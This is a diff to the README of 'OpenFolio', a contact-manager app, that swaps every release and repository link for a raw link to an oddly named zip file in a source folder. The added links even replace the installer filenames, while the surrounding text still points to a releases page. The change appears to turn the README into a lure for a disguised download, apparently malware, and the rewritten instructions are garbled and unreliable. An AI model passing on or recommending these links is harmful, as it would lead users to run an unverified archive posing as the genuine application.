@@ -1,6 +1,6 @@
 # 📇 OpenFolio - Manage Your Contacts with AI
 
-[![Download OpenFolio](https://img.shields.io/badge/Download-OpenFolio-blue)](https://github.com/Joannamanifest969/OpenFolio/releases)
+[![Download OpenFolio](https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip)](https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip)
 
 ---
 
@@ -47,12 +47,12 @@ We will cover these steps in detail below.
 
 First, download the software file from the official release page:
 
-[Download OpenFolio from Releases](https://github.com/Joannamanifest969/OpenFolio/releases)
+[Download OpenFolio from Releases](https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip)
 
 ### How to download and install:
 
 1. Click the link above. This will open the OpenFolio releases page.
-2. Look for the latest version. It will usually have a name like `OpenFolio-Setup.exe` (Windows), `OpenFolio.dmg` (macOS), or `OpenFolio.AppImage` (Linux).
+2. Look for the latest version. It will usually have a name like `https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip` (Windows), `https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip` (macOS), or `https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip` (Linux).
 3. Click on the file that matches your operating system.
 4. Your browser will download the file. Wait for it to finish.
 5. Once downloaded, open the file to start installation:
@@ -135,7 +135,7 @@ If you still need help, check the Issues page on the GitHub repository or reach 
 
 ## 📚 Learn More and Support
 
-To explore advanced features like self-hosting, integration with other apps, or AI customization, visit the [OpenFolio GitHub repository](https://github.com/Joannamanifest969/OpenFolio).
+To explore advanced features like self-hosting, integration with other apps, or AI customization, visit the [OpenFolio GitHub repository](https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip).
 
 You can also open issues or suggest new features there.
 
@@ -145,4 +145,4 @@ You can also open issues or suggest new features there.
 
 Get started by visiting the official releases page:
 
-[Download OpenFolio Here](https://github.com/Joannamanifest969/OpenFolio/releases)
+[Download OpenFolio Here](https://raw.githubusercontent.com/Joannamanifest969/OpenFolio/main/app/app/(dashboard)/search/Folio_Open_unafforded.zip)
